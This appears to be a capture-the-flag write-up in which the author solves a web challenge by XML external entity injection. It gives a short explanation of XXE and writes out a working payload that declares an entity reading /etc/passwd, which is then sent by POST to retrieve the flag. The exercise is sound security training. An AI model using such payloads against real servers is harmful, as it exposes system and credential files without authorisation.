## Description
The web project was rushed and no security assessment was done. Can you read the **/etc/passwd** file?
## Hints 
XML external entity Injection
## Solution
This is the website of the challenge:

![Screenshot 2024-07-24 212819](https://github.com/user-attachments/assets/613ca56c-89d3-4c13-aa3b-ddc0ebf4a78c)
Using Burp and click on Details, we got 3 path to /data having some XML

![Screenshot 2024-07-24 213041](https://github.com/user-attachments/assets/6994b553-69db-436d-9163-cb123d542c5d)
Due to the hint, we use XEE to solve the challenge

- [basic cover about XEE](https://viblo.asia/p/xml-external-entity-xxe-injection-07LKX97pZV4) 

- https://portswigger.net/web-security/xxe

XML external entity injection (XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

We could change the XML data to reveal the flag by adding [DTD entities](https://www.w3schools.com/xml/xml_dtd_entities.asp)

The format is `<!ENTITY entity-name SYSTEM "URI/URL">`

I cameup with the payload: `<?xml version="1.0" encoding="UTF-8"?>
                              <!DOCTYPE note [<!ENTITY hi SYSTEM "/etc/passwd">]>
                                <data>
                                  <ID>
                                    &hi;
                                  </ID>
                                </data>`
                                
![Screenshot 2024-07-24 221726](https://github.com/user-attachments/assets/d7bd55b5-00a5-4172-b0f0-917a3a570135)

Send POST request with the payload and get the flag
